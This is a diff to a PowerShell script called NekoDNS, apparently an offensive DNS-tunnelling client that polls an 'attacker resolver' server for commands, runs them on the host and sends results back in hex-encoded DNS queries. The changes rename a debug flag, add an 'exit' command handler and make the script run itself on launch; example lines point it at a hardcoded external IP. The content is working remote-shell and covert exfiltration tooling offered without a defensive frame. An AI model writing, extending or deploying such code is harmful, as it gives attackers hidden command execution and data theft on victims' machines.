@@ -9,7 +9,7 @@ function NekoDNS {
         [string]$Domain,
         [int]$Length = 32,
         [int]$Sleep = 300,
-        [switch]$DebugMode,
+        [switch]$Verbose,
         [switch]$Random,
         [switch]$TCP,
         [switch]$Help
@@ -17,13 +17,13 @@ function NekoDNS {
 
     function Show-Help {
         Write-Host @"
-Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <sleep_ms> -Random -DebugMode -TCP
+Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <sleep_ms> -Random -Verbose -TCP
   -Server <server>       Attacker resolver DNS server IP (or domain) to use (required)
   -Domain <domain>       Base domain to tunnel over (required unless -Random)
   -Length <length>       Maximum hex-chars per chunk (default: 32)
   -Sleep <milsecs>       Sleep interval between polls/sends in ms (default: 300)
   -Random                Use random subdomains (if set, -Domain is optional)
-  -DebugMode             Enable debug/verbose output
+  -Verbose               Enable debug/verbose output
   -TCP                   Use TCP for DNS queries
   -Help                  Show this help message
 "@
@@ -49,7 +49,7 @@ Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <
 
     function Debug {
         param([string]$msg)
-        if ($DebugMode) {
+        if ($Verbose) {
             Write-Host "[DEBUG] $msg"
         }
     }
@@ -386,6 +386,14 @@ Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <
                     $output = ""
                 }
 
+            } elseif ($decodedCommand.StartsWith("exit", [System.StringComparison]::OrdinalIgnoreCase)) {
+                Debug "Received termination command - exiting client"
+                Send-Chunk -Type "s" -HexData "" -DomainToUse $domainToUse | Out-Null
+                Send-Chunk -Type "e" -HexData "" -DomainToUse $domainToUse | Out-Null
+                Debug "Client exiting.."
+                break
+                exit
+
             } else {
                 Debug "Executing: $decodedCommand"
                 try {
@@ -424,5 +432,7 @@ Usage: NekoDNS -Server <server> -Domain <domain> -Length <chunk_length> -Sleep <
 }
 
 # Examples
-# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -DebugMode -Random
-# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -DebugMode -Random -TCP
+# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -Verbose -Random
+# NekoDNS -Server 88.66.44.22 -Domain test.com -Length 32 -Sleep 300 -Verbose -Random -TCP
+
+NekoDNS @args
